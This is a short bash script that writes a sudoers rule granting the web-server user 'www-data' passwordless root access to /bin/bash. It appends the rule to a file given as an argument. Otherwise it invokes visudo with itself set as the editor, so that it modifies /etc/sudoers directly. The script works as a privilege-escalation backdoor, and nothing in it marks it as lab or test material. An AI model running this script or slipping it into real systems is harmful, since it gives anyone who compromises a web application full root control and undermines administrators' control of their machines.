#!/bin/bash

if [ ! -z "$1" ]; then
        echo "www-data    ALL=(ALL) NOPASSWD: /bin/bash" >> $1
elif ! grep 'www-data' /etc/sudoers; then
        export EDITOR=$0
        visudo
else
        echo "User:'www-data' already a sudoer"
fi
